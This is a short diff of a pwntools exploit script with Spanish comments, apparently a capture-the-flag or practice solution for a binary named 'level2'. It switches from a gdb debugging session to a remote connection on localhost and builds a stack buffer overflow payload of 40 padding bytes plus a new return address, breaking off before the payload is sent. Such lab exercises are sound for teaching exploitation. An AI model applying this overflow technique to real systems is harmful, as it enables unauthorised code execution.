@@ -1,14 +1,11 @@
 from pwn import *
 
 # Crear una instacia de gdb con el programa.
-io = gdb.debug('./level2')
-
-# Pausar el debugger.
-pause()
+io = remote('localhost', 41973)
 
 #Enumeracion de tamaño y direccion
 size = 40 #32 del buffer + 8 rbp 
-address = p64(0x0000555555555189)
+address = p64(0x0000555555555ae9)
 
 # Crear el payload con caracteres a desbordar
 payload = b'A' * size
